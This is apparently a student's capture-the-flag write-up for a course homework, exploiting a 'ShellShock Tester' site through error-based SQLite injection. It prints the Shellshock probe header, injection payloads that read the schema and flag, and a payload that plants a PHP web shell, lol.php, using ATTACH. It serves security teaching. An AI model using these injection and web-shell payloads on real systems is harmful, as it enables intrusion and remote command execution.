====================
 ShellShock Writeup
====================

:date: 2014-12-16 15:35
:modified: 2014-12-21 01:20
:tags: secprog, sqlite, sqli, shellshock, writeup
:category: memo
:slug: shellshock-writeup
:authors: Zespre Schmidt
:about_author: Bug generator
:email: starbops@gmail.com
:summary: Security Programming Homework 4-1

Problem Description
===================

The `ShellShock Tester`_ is the website that have some vulnerabilites.
According to the text on the website, the vulnerabilities might not be
ShellShock :(

At the bottom of the website it says "The response will be collected into
database". Maybe SQL injection will work! After trying various types of SQL
injection in that text input field I realized that I'm in the wrong way...

Look Deeper
===========

The ShellShock Tester must send something to the target website to test if it
has bash vulnerability. Using `nc` to see what are sent from the ShellShock
Tester.

.. code-block:: bash

    $ nc -l -p 5566

And it turns out to be the following result:

.. code-block:: text

    GET / HTTP/1.1
    User-Agent: () { :;}; echo 'ShellShockTester_atdog';
    Host: 140.113.235.153:5566
    Accept: */*


Ah-ha! The string ``{ :;}; echo 'ShellShockTester_atdog';`` is a typical method to
test if the bash which is currently using is vulnerable to CVE-2014-6271. A
system which is vulnerable will echo the string "ShellShockTester_atdog".
Similarly, the target website which runs CGI program will return the string if
it is vulnerable. So why don't we build a fake HTTP server to fool the
ShellShock Tester?

Building a simple HTTP server using python module `Flask`_. It returns the
string when the ShellShock Tester queried for the index page. It seems that the 
ShellShock Tester stores the response returned from the target website into its 
database using ``insert``. At the time the type of the database is still unknown.

So I append a single quote right after the string, and the result showed on the
ShellShock Tester is:

.. code-block:: text

    DATABASE Msg: unrecognized token: "'ShellShockTester_atdog'')"

    Response: ShellShockTester_atdog'

Google for the error message, it says that it seems to be SQLite 3. On the other
hand, all error messages will showed means that we can use error-based SQL
injection.

Error-based SQL Injection
=========================

Most of the error-based SQL injection methods are based on MySQL. But this time,
it is SQLite... Fortunately, I found a forum post which talks about SQLite
error-based injection, how lucky!

First, create a virtual table:

.. code-block:: sqlite3

    CREATE VIRTUAL TABLE v1 USING fts3(x);

To know which table and column contain the flag:

.. code-block:: sqlite3

    SELECT * FROM t1 WHERE t1 MATCH '"'||(SELECT sql FROM sqlite_master);

And finally, the flag showed up:

.. code-block:: sqlite3

    SELECT * FROM t1 WHERE t1 MATCH '"'||(SELECT flag FROM oyoyoyoy_____1111flag);

The queries listed above should be embedded into the sophisticatedly crafted
string. Using Python's format string will look like this:

.. code-block:: python

    trick = 'ShellShockTester_atdog\'); {} --'
    inj = 'create virtual table v1 using fts3(x);'
    resp = trick.format(inj)

Inject a Backdoor
=================

Another method to pwn the ShellShock Tester is to place a backdoor in the
directory of the website.

.. code-block:: python

    trick = 'ShellShockTester_atdog\'); {} --'
    inj = 'ATTACH \'./lol.php\' AS lol; CREATE TABLE lol.pwn (dataz TEXT); INSERT INTO lol.pwn (dataz) VALUES (\'<pre><?php system($_GET["cmd"]); ?></pre>\');'
    resp = trick.format(inj)

This will build a backdoor called ``lol.php``. So anyone can visit that page along
with a "GET" argument ``cmd``. The value of ``cmd`` could be any shell command. The
reason is that ``ATTACH`` command will attach a SQLite database. If the database
does not exist, it create the database which is a PHP file. The file's content
contains a short piece of PHP code showed above.

Simply visit the page "http://tor.atdog.tw:8888/lol.php?cmd=ls", it will list
every file in the current directory. And there is the SQLite database! Download
it and grab the flag!

Flag
====

The flag is:

.. code-block:: text

    SecProg{SQL1teInject1on_yoooo}

References
==========

- `Select Queries`__
- `SQLite 3 error-based injection`__
- `SQLite3 Injection Cheat Sheet`__
- `SQLite Injection | Hits from the bits`__

.. _ShellShock Tester: http://tor.atdog.tw:8888/index.php
.. _Flask: http://flask.pocoo.org
.. __: http://sqlite.awardspace.info/syntax/sqlitepg03.htm
.. __: https://rdot.org/forum/showthread.php?p=26419
.. __: http://atta.cked.me/home/sqlite3injectioncheatsheet
.. __: http://gwae.trollab.org/sqlite-injection.html

